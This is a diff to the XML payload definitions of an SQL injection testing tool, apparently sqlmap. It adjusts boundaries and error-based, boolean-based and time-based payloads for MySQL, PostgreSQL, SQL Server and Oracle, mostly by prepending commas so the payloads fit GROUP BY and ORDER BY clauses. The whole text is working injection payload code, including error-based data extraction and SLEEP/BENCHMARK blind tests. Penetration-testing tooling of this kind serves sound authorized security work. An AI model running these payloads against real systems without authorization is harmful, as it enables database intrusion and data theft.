@@ -393,16 +393,6 @@ Formats:
     </boundary>
     <!-- End of WHERE clause boundaries -->
 
-    <!-- GROUP BY and ORDER BY clauses boundaries -->
-    <boundary>
-        <level>2</level>
-        <clause>2,3</clause>
-        <where>1,2</where>
-        <ptype>1</ptype>
-        <prefix>,</prefix>
-        <suffix></suffix>
-    </boundary>
-    <!-- End of GROUP BY and ORDER BY clauses boundaries -->
 
     <!-- Login forms to use with OR-based tests boundaries -->
     <boundary>
@@ -604,16 +594,6 @@ Formats:
         <suffix></suffix>
         <comment>--</comment>
     </boundary>
-
-    <boundary>
-        <level>2</level>
-        <clause>2,3</clause>
-        <where>1,2</where>
-        <ptype>1</ptype>
-        <prefix>,</prefix>
-        <suffix></suffix>
-        <comment>--</comment>
-    </boundary>
     <!-- End of login forms to use with OR-based tests boundaries -->
 
 
@@ -662,10 +642,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
+            <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
+            <comparison>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -682,10 +662,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+            <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+            <comparison>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -701,10 +681,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+            <comparison>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -720,10 +700,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</payload>
+            <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</comparison>
+            <comparison>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</comparison>
         </response>
         <details>
             <dbms>Oracle</dbms>
@@ -741,10 +721,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END))</payload>
+            <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END))</comparison>
+            <comparison>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END))</comparison>
         </response>
     </test>
 
@@ -1046,15 +1026,15 @@ Formats:
 
     <!-- Error-based tests - GROUP BY and ORDER BY clauses -->
     <test>
-        <title>MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses (append)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <epayload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</epayload>
+        <epayload>, (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</epayload>
         <request>
-            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+            <payload>, (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1066,15 +1046,15 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL error-based - GROUP BY and ORDER BY clauses</title>
+        <title>PostgreSQL error-based - GROUP BY and ORDER BY clauses (append)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <epayload>(CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC))</epayload>
+        <epayload>, (CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC))</epayload>
         <request>
-            <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+            <payload>, (CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1085,15 +1065,15 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase error-based - ORDER BY clause</title>
+        <title>Microsoft SQL Server/Sybase error-based - ORDER BY clause (append)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
         <clause>3</clause>
         <where>1</where>
-        <epayload>(CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]')))</epayload>
+        <epayload>, (CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]')))</epayload>
         <request>
-            <payload>(CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
+            <payload>, (CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1104,15 +1084,15 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle error-based - ORDER BY clause</title>
+        <title>Oracle error-based - ORDER BY clause (append)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
         <clause>3</clause>
         <where>1</where>
-        <epayload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</epayload>
+        <epayload>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</epayload>
         <request>
-            <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1123,7 +1103,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses (replace)</title>
         <stype>2</stype>
         <level>4</level>
         <risk>0</risk>
@@ -1143,7 +1123,7 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL error-based - GROUP BY and ORDER BY clauses</title>
+        <title>PostgreSQL error-based - GROUP BY and ORDER BY clauses (replace)</title>
         <stype>2</stype>
         <level>4</level>
         <risk>0</risk>
@@ -1162,7 +1142,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase error-based - ORDER BY clause</title>
+        <title>Microsoft SQL Server/Sybase error-based - ORDER BY clause (replace)</title>
         <stype>2</stype>
         <level>4</level>
         <risk>0</risk>
@@ -1181,7 +1161,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle error-based - ORDER BY clause</title>
+        <title>Oracle error-based - ORDER BY clause (replace)</title>
         <stype>2</stype>
         <level>4</level>
         <risk>0</risk>
@@ -1437,7 +1417,7 @@ Formats:
         <stype>5</stype>
         <level>1</level>
         <risk>1</risk>
-        <clause>1</clause>
+        <clause>1,2,3</clause>
         <where>1</where>
         <epayload>AND IF((%s), [RANDNUM], SLEEP([SLEEPTIME]))</epayload>
         <request>
@@ -1457,7 +1437,7 @@ Formats:
         <stype>5</stype>
         <level>2</level>
         <risk>1</risk>
-        <clause>1</clause>
+        <clause>1,2,3</clause>
         <where>1</where>
         <epayload>AND IF((%s), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</epayload>
         <request>
@@ -1525,7 +1505,7 @@ Formats:
         <stype>5</stype>
         <level>2</level>
         <risk>3</risk>
-        <clause>1</clause>
+        <clause>1,2,3</clause>
         <where>1</where>
         <epayload>OR IF((%s), [RANDNUM], SLEEP([SLEEPTIME]))</epayload>
         <request>
@@ -1545,7 +1525,7 @@ Formats:
         <stype>5</stype>
         <level>3</level>
         <risk>3</risk>
-        <clause>1</clause>
+        <clause>1,2,3</clause>
         <where>1</where>
         <epayload>OR IF((%s), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</epayload>
         <request>
